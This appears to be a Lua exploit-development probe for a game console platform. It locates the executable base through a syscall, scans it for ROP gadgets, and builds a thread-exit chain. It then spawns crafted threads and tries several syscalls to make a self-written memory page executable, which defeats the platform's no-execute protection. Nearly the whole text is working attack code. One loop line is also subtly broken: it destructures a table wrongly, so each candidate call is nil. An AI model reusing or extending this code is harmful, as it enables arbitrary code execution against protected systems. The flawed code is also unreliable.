-- CRASH_CLASS: HIGH
-- PROBE 928a: executable-page oracle. The one question this answers is whether a page we
-- own can be made executable at all (task: run our own code, not eboot gadgets).
--
-- Method: a child thread is spawned with RIP inside a page we wrote. The page holds a single
-- 0xC3 (ret); the child's stack points at a thr_exit(431) chain, so if the page is executable
-- the child RETs into the exit chain and the process survives. If the page is not executable
-- the SIGSEGV kills the child, and with it the process: survival IS the pass.
--
-- Every candidate X-granting call is applied to the page first, with its return printed.
-- ONCE a run survives, bisect by setting ONLY to one name.
-- Precondition: 74 (mprotect PROT_EXEC) alone is known to fail, so a survival here is news.
print("=== PROBE 928a: executable-page oracle ===")
local function to_num(v)
    if type(v)=="table" then
        if v.tonumber then local n=v:tonumber() if n then return n end end
        if v.h then return v.h*4294967296+v.l end
    end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local fn=to_num(syscall.pipe.fn_addr)
print("[0] pid="..tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
local info=memory.alloc(0x200); wd(info,0x160)
pcall(function() mk(593)(uint64(0),uint64(info)) end)
local ebase=(rd(info+0x10C) or 0)*4294967296+(rd(info+0x108) or 0)
local function find_pat(base,limit,pat)
    local off=0
    while off<limit do local want=limit-off; if want>0x1000 then want=0x1000 end
        local ok,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not ok or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true); if i then return base+off+i-1 end
        off=off+want end
end
local pop_rax=find_pat(ebase,0x494000,string.char(0x58,0xC3))
local pop_rdi=find_pat(ebase,0x494000,string.char(0x5F,0xC3))
local store  =find_pat(ebase,0x494000,string.char(0x48,0x89,0x07,0xC3))
local jmp_g  =find_pat(ebase,0x494000,string.char(0xEB,0xFE))
print(string.format("[0] gadgets rax=%s rdi=%s store=%s",tostring(pop_rax),tostring(pop_rdi),tostring(store)))
if not (pop_rax and pop_rdi and store and jmp_g) then print("[!] gadget search failed"); return end

local page=0x4000
local function mmap(px) local _,a=pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end); local v=to_num(a); if v~=0 then zero(v,px) end; return v end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RCX=0x060,R8=0x068,RAX=0x078}
local ctx=memory.alloc(0x500)
local tb=memory.alloc(8)

-- one spawn: entry=RIP, RSP=start where start holds an exit chain
local function spawn(entry, start)
    zero(ctx,0x500); wq(tb,uint64(0))
    wq(ctx+Ctx.MAGIC,uint64(0x480)); wq(ctx+Ctx.TYPE,uint64(0x10000))
    wq(ctx+Ctx.CS,uint64(0x43));    wq(ctx+Ctx.SS,uint64(0x3B))
    wq(ctx+Ctx.RIP,uint64(entry));  wq(ctx+Ctx.RSP,uint64(start))
    wq(ctx+Ctx.RDI,uint64(0));      wq(ctx+Ctx.RAX,uint64(20))
    local ok,rv=pcall(function() return mk(430)(uint64(ctx),uint64(tb),uint64(0)) end)
    return ok and to_num(rv) or -999
end

-- write an exit chain at start: thr_exit(431)
local function exit_chain(start)
    local ch={pop_rdi,0,pop_rax,431,fn,jmp_g}
    for k=1,#ch do wq(start+(k-1)*8,uint64(ch[k])) end
end

-- control: entry in eboot, must survive. Proves the harness and the oracle are sound.
local ctl=mmap(page*4); local cstart=ctl+page*4-0x200
exit_chain(cstart)
print("[A] control spawn (eboot gadget chain)")
local rvA=spawn(pop_rdi, cstart)
print("[A] rv="..tostring(rvA).." (survived)")

local target=mmap(page)
if target==0 then print("[!] mmap failed"); return end
wd(target,0xC3)  -- ret, then three zero bytes
print(string.format("[B] target page=0x%X first dword=0x%X",target,rd(target) or 0))

local ONLY=nil  -- set to a candidate name to bisect
local cands={
  {"mprotect74",        function() return mk(74)(uint64(target),uint64(page),uint64(7)) end},
  {"vm548_a",           function() return mk(548)(uint64(2),uint64(target),uint64(page),uint64(7)) end},
  {"vm548_b",           function() return mk(548)(uint64(target),uint64(page),uint64(7),uint64(2)) end},
  {"mtype585_a",        function() return mk(585)(uint64(target),uint64(page),uint64(7),uint64(0)) end},
  {"mtype585_b",        function() return mk(585)(uint64(0),uint64(target),uint64(page),uint64(7)) end},
}
for i=1,#cands do
    local name,f=cands[i]
    if ONLY==nil or ONLY==name then
        local ok,v=pcall(f)
        local r
        if ok then r=to_num(v) end
        print(string.format("[C] %-12s ok=%s rv=%s",name,tostring(ok),tostring(r)))
        if not ok then print("[C] "..name.." raised") end
    end
end

-- the oracle: RIP inside our page. Survival means the page executes.
print("[D] spawn with RIP in our page (death here means no execute permission)")
local rvD=spawn(target, cstart)
print("[D] rv="..tostring(rvD))
print("[Z] SURVIVED - the page executed")
